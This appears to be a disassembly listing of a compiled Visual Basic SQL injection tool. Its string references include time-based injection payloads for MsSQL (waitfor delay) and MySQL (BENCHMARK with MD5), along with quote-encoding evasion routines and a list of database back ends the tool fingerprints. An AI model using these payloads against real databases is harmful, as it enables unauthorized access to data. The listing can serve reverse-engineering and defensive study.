'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaEnd
'N  * ref: __vbaExitProc
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_160()
'N  * ref: __vbaExceptHandler
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "Testing for MsSQL time based injection with "
'N  * ref: __vbaStrR4
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: " ms delay"
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: _adj_fdiv_m32
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarIdiv
'N  * ref: __vbaVarMod
'N  * ref: __vbaVarIdiv
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarMove
'N  * ref: "00"
'N  * ref: __vbaVarDup
'N  * ref: Format(
'N  * ref: ":"
'N  * ref: "00"
'N  * ref: __vbaVarDup
'N  * ref: ":"
'N  * ref: "00"
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: "; if (1=1) waitfor delay '"
'N  * ref: "'--"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "; if (%True_Expression%) waitfor delay '"
'N  * ref: "'--"
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: "MsSQL time based"
'N  * ref: __vbaStrCopy
'N  * ref: "MsSQL time based injection method can be used ("
'N  * ref: __vbaStrR4
'N  * ref: __vbaStrMove
'N  * ref: "ms delay)"
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrMove
'N  * ref: "; if (1=1) waitfor delay '"
'N  * ref: "'--"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "Injection type is String (')"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrMove
'N  * ref: "; if (%True_Expression%) waitfor delay '"
'N  * ref: "'--"
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "MsSQL time based injection method can't be used"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFPException
'End Sub
 
'Sub Subr_161()
'N  * ref: __vbaExceptHandler
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "Testing for MySQL time based injection with "
'N  * ref: __vbaStrR4
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: " ms delay"
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFpI4
'N  * ref: __vbaVarDup
'N  * ref: "/*!30000"
'N  * ref: IIf(
'N  * ref: "*/"
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: " and "
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarCat
'N  * ref: "if(1=1,BENCHMARK("
'N  * ref: ",MD5(0x41)),0)"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: " and "
'N  * ref: __vbaStrCat
'N  * ref: "/*!30000"
'N  * ref: IIf(
'N  * ref: "if(%True_Expression%,BENCHMARK(%BenchMark%,MD5(0x41)),0)"
'N  * ref: "*/"
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: "/*!30000"
'N  * ref: IIf(
'N  * ref: "*/"
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: " and "
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: "if(1=1,BENCHMARK("
'N  * ref: ",MD5(0x41)),0)"
'N  * ref: " and "
'N  * ref: "="
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "Injection type is String (')"
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: " and "
'N  * ref: __vbaStrCat
'N  * ref: "/*!30000"
'N  * ref: IIf(
'N  * ref: "if(%True_Expression%,BENCHMARK(%BenchMark%,MD5(0x41)),0)"
'N  * ref: "*/"
'N  * ref: IIf(
'N  * ref: "x"
'N  * ref: " and "
'N  * ref: "="
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrMove
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarMul
'N  * ref: Round(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrVarVal
'N  * ref: "%BenchMark%"
'N  * ref: Replace(
'N  * ref: __vbaFreeStr
'N  * ref: "MySQL time based injection method can be used ("
'N  * ref: __vbaStrR4
'N  * ref: __vbaStrCat
'N  * ref: "ms delay)"
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "MySQL time based"
'N  * ref: __vbaStrCopy
'N  * ref: "MySQL time based injection method can't be used"
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFPException
'End Sub
 
'Sub Subr_162()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaChkstk
'N  * ref: __vbaOnError
'N  * ref: __vbaVarMove
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: _adj_fdiv_m64
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFPException
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_163()
'N  * ref: __vbaExceptHandler
'N  * ref: "Finding current data base"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_180
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: Subr_171
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrMove
'N  * ref: Subr_148
'N  * ref: __vbaUI1I2
'N  * ref: "Injection Syntax: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_170
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub Subr_164()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaNew
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'End Sub
 
'Sub Subr_165()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCopy
'N  * ref: Subr_166
'N  * ref: __vbaVarMove
'N  * ref: "'"
'N  * ref: "%27"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaOnError
'N  * ref: Subr_164
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrCmp
'N  * ref: "\\'"
'N  * ref: "'"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaUI1I2
'N  * ref: Subr_165
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_166()
'N  * ref: __vbaExceptHandler
'N  * ref: "'"
'N  * ref: "&apos;"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: "'"
'N  * ref: "&#39;"
'N  * ref: __vbaFreeStr
'N  * ref: "'"
'N  * ref: "&#039;"
'N  * ref: __vbaFreeStr
'N  * ref: "'"
'N  * ref: "&#0039;"
'N  * ref: __vbaFreeStr
'N  * ref: "'"
'N  * ref: "\'"
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_167()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "<[^>]+>([^<]+)<?"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_164
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeStr
'N  * ref: __vbaForEachCollObj
'N  * ref: __vbaVarAnd
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaHresultCheckObj
'N  * ref: " "
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: " "
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: "="
'N  * ref: "?"
'N  * ref: "html"
'N  * ref: ">"
'N  * ref: "<"
'N  * ref: ","
'N  * ref: """"
'N  * ref: vbTab
'N  * ref: vbCr
'N  * ref: vbLf
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCmpGe
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaNextEachCollObj
'N  * ref: vbCrLf
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: " "
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: " "
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: "="
'N  * ref: "?"
'N  * ref: "html"
'N  * ref: ">"
'N  * ref: "<"
'N  * ref: ","
'N  * ref: """"
'N  * ref: vbTab
'N  * ref: vbCr
'N  * ref: vbLf
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCmpGe
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaVarForNext
'N  * ref: __vbaVarMove
'N  * ref: __vbaExitProc
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarForInit
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarForInit
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCopy
'N  * ref: __vbaVarForNext
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCopy
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_168()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaI2Var
'N  * ref: Mid(
'N  * ref: __vbaStrVarVal
'N  * ref: Asc(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "+"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrVarVal
'N  * ref: Asc(
'N  * ref: Hex(
'N  * ref: "%"
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarCat
'N  * ref: "0"
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_169()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaChkstk
'N  * ref: __vbaOnError
'N  * ref: __vbaVarMove
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjIs
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarForNext
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_170()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaNew2
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCmp
'N  * ref: "MSSQL 2000 with error"
'N  * ref: "MSSQL 2005 with error"
'N  * ref: "MsSQL with error"
'N  * ref: "MsSQL"
'N  * ref: "MSSQL no error"
'N  * ref: "MsSQL no error"
'N  * ref: "Sybase (ASE)"
'N  * ref: "MsSQL Blind"
'N  * ref: "MsSQL time based"
'N  * ref: "Sybase (ASE) Blind"
'N  * ref: "Sybase (ASE)"
'N  * ref: "MySQL"
'N  * ref: "MySQL >=4.1"
'N  * ref: "MySQL >=5"
'N  * ref: "MySQL unknown ver"
'N  * ref: "MySQL Blind"
'N  * ref: "MySQL error based"
'N  * ref: "MySQL time based"
'N  * ref: "MSAccess"
'N  * ref: "MsAccess Blind"
'N  * ref: "MsAccess"
'N  * ref: "Oracle"
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Oracle error based"
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "PostgreSQL"
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_171()
'N  * ref: __vbaExceptHandler
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: Right(
'N  * ref: __vbaVarCmpEq
'N  * ref: "with error"
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_197
'N  * ref: __vbaVarMove
'N  * ref: __vbaStrCmp
'N  * ref: "MsSQL no error"
'N  * ref: "MSSQL no error"
'N  * ref: Subr_229
'N  * ref: __vbaVarMove
'N  * ref: "MsSQL Blind"
'N  * ref: __vbaStrCmp
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_687
'N  * ref: __vbaVarMove
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_210
'N  * ref: __vbaVarMove
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_672
'N  * ref: __vbaVarMove
